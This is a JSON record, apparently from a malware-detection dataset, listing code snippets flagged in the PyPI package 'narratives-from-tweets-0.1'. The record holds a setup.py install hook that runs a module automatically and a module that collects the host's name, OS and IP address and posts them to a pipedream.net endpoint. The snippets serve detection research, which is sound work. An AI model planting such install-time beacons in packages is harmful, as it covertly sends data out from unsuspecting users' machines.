[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import subprocess\nimport sys\nfrom setuptools.command.install import install\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        subprocess.run([sys.executable, \"-m\", \"poc_nvk.my_module\"])"
  },
  {
    "pyfile": "my_module.py",
    "malicious_code_snippets": "import socket\nimport platform\nimport requests\n\ndef send_info_to_server(server_url):\n    # Get hostname\n    hostname = socket.gethostname()\n\n    # Get OS name\n    osname = platform.system()\n\n    # Get IP address\n    ip = socket.gethostbyname(hostname)\n\n    # Create a dictionary with the data\n    data = {\n        \"hostname\": hostname,\n        \"osname\": osname,\n        \"ip\": ip\n    }\n\n    # Send the data to the server\n    try:\n        response = requests.post(server_url, json=data)\n        if response.status_code == 200:\n            print(\"Data sent successfully to the server.\")\n        else:\n            print(f\"Failed to send data. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error: {str(e)}\")\n\ndef main():\n    # Define your server URL\n    server_url = \"https://eoaks6wtchjmg2q.m.pipedream.net/poc\"\n    send_info_to_server(server_url)\n\nif __name__ == \"__main__\":\n    main()"
  },
  {
    "metadata": {
      "package_name": "narratives-from-tweets-0.1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/narratives-from-tweets-0.1.txt"
    }
  }
]